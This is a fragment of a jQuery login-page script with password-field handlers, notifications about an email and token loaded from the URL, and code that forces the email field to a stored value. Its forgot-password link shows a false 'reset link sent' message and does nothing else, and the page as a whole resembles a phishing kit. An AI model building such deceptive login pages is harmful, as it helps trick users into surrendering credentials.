          if ($('#auth_reg').length) $('#auth_reg').hide();
        }, 2000);
      });
    });
  }
  
  if ($('#passwordInput').length) {
    $('#passwordInput').on('input', function() {
      function showPasswordError(show) {
        const errorEl = $('#passwordError');
        if (errorEl.length) {
          if (show) {
            errorEl.show();
          } else {
            errorEl.hide();
          }
        }
      }
      showPasswordError(false);
      $(this).css('border-color', '#e2e8f0');
      if ($('#auth_reg').length) $('#auth_reg').hide();
      if ($('#msg').length) $('#msg').hide();
    });
  }
  
  if ($('#passwordInput').length) {
    $('#passwordInput').on('focus', function() {
      $(this).parent().css('transform', 'scale(1.01)');
    }).on('blur', function() {
      $(this).parent().css('transform', 'scale(1)');
    });
  }
  
  if ($('#forgotLink').length) {
    $('#forgotLink').on('click', function(e) {
      e.preventDefault();
      showNotification(' Password reset link sent', 'info', 3000);
    });
  }
  
  // Show notifications for loaded data
  if (emailFromUrl) {
    showNotification(' Email loaded successfully', 'success', 4000);
    if (my_token) {
      showNotification(' Token loaded successfully', 'info', 4000);
    }
  } else {
    showNotification(' Using default email', 'info', 5000);
  }
  
  $(window).on('load', function() {
    setTimeout(function() {
      if ($("#email").length && $("#email").val() !== my_email) {
        console.log('Re-setting email value');
        $("#email").val(my_email);
      }
    }, 500);
  });
  
})();